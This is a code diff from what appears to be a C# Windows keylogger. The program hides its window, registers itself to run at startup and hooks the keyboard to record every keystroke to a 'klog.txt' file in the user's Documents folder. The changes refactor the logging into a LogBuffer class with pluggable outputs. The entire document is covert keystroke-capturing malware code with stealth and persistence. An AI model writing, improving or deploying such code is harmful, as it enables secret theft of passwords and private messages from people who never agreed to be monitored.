@@ -16,10 +16,7 @@ public static class Program
     private const int SYSKEYDOWN = 0x0104;
     // ReSharper restore InconsistentNaming
 
-    private static readonly string PathToFile =
-        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt");
-
-    private static readonly StreamWriter Writer = new(PathToFile, true);
+    private static readonly LogBuffer Buffer = new();
     private static UnhookWindowsHookExSafeHandle? _kbHook;
     private static bool _capsLockActive;
     private static bool _shiftActive;
@@ -27,16 +24,11 @@ public static class Program
     public static unsafe void Main()
     {
         HideWindow();
-        LogFile.WriteInfo(PathToFile, Writer);
         AddToStartup();
 
-        // write buffer on process exit
-        AppDomain.CurrentDomain.ProcessExit += (_, _) =>
-        {
-            _kbHook?.Close();
-            StringBuffer.Write(Writer);
-            Writer.Dispose();
-        };
+        var logFile =
+            new LogFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt"));
+        Buffer.AddOutput(logFile);
 
         // TODO check something weird going on
         _capsLockActive = Keyboard.GetCapsLockState();
@@ -74,7 +66,9 @@ public static class Program
         // handle keyup events as it is important with shift, alt and control
         if (wParam == KEYUP) stringToWrite = Keyboard.HandleKeyUp(kbStruct, ref _shiftActive);
 
-        StringBuffer.WriteToFile(stringToWrite, Writer);
+        Buffer.Add(stringToWrite);
+
+        // StringBuffer.WriteToFile(stringToWrite, Writer);
 
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
     }
@@ -100,4 +94,10 @@ public static class Program
         shortcut.TargetPath = path;
         shortcut.Save();
     }
+}
+
+
+public interface ILogger
+{
+    public void Write(LogBuffer buffer);
 }
